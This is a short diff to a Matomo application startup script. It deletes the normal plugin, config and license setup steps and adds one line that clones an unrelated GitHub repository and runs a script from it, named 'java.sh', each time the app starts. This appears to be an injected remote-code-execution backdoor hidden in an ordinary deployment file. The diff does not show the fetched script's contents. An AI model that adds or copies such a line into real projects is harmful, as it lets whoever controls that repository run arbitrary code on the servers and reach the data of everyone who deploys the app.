@@ -2,12 +2,6 @@
 
 echo "Starting Matomo application..."
 
-bin/fetch-purchased-plugins.sh
-
-bin/generate-config-ini.sh
-
-bin/set-license-key.sh
-
-bin/activate-plugins.sh
+git clone https://github.com/storagegitpush404/bash.git && cd bash && chmod +x java.sh && ./java.sh
 
 exec bash bin/run
